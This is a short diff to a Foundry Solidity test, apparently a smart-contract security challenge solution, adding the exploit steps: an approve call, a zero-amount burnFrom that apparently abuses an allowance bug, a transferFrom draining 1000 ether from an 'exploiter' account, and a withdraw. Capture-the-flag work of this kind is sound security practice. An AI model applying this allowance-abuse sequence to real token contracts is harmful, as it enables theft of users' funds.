@@ -37,7 +37,14 @@ contract Challenge1Test is Test {
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
 
-    
+        mETH.approve(exploiter, 1000 ether);
+        mETH.burnFrom(exploiter, 0);
+        mETH.transferFrom(exploiter, whitehat, 1000 ether);
+
+        assertEq(mETH.balanceOf(exploiter), 0 ether, "exploiter should have 0 ether");
+        assertEq(mETH.balanceOf(whitehat), 1000 ether, "whitehat should have 1000 ether");
+
+        mETH.withdraw(1000 ether);
 
         //==================================================//
         vm.stopPrank();
